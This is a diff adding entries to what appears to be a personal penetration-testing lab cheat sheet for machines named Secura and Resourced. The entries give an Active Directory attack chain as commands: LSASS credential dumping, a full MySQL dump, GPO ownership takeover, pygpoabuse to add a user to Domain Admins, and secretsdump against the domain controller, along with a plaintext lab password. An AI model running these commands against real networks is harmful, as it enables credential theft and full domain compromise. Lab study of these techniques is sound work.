@@ -1,4 +1,14 @@
 
+#### Secura => Lsassy, MySQL, WriteOwner + GPLink 
+1. On M1 user is admin, run `nxc smb {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}' -M lsassy` 
+2. On M2 `mysqldump.exe -u root --all-databases > dump.sql` 
+3. On M2 `Get-DomainGPO -Identity "Default Domain Policy" | Select-Object name, displayname` 
+4. On M3 `Set-DomainObjectOwner -Identity "31B2F340-016D-11D2-945F-00C04FB984F9" -OwnerIdentity charlotte` 
+5. On M3 `Add-DomainObjectAcl -TargetIdentity "31B2F340-016D-11D2-945F-00C04FB984F9" -PrincipalIdentity charlotte -Rights All` 
+6. On kali `python3 pygpoabuse.py -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -dc-ip 192.168.131.97 -command "net group \"Domain Admins\" charlotte /add /domain" 'secura.yzx/charlotte:Game2On4.!'` 
+7. On M3 `gpupdate /force` then kali `impacket-secretsdump 'secura.yzx/charlotte:Game2On4.!@192.168.131.97'` 
+
+
 #### Resourced => RBCD 
 1. Check enum4linux properly! `crackmapexec winrm {{DC_IP}} -u names.txt -H hashes.txt` 
 2. User has SeMachineAccountPrivilege = can create machine accounts even if ms-DS-MachineAccountQuota = 0 
